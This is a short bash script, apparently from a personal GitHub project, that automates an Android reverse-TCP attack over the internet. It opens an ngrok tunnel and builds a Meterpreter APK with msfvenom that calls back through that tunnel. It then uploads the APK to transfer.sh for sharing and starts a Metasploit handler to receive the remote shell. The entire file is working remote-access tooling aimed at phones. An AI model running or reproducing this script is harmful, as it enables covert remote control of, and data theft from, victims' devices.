#!/bin/bash
gnome-terminal --working-directory=$(pwd) -e "./ngrok tcp 4569"
clear
printf "\033[1;31m*** Android Reverse TCP over WAN using NGROK ***\033[0m\n"
echo -e "\t*** https://github.com/its-arun ***"
sleep 3.5;
rport=$( curl -sS http://localhost:4040/api/tunnels | jq '.tunnels[0].public_url' | cut -d ":" -f 3 | sed 's/\"//g' );
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$rport R >/Users/arun/apkrat/payload.apk
echo "Payload Generated";
ulink=$( curl -sS --upload-file ./payload.apk https://transfer.sh/payload.apk );
echo "Payload APK uploaded at " $ulink;
echo "Starting msfconsole"
touch auto.rc
echo "use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4569
exploit" > auto.rc
echo "Exploitation Started";
gnome-terminal --working-directory=$(pwd) -e "msfconsole -r auto.rc"
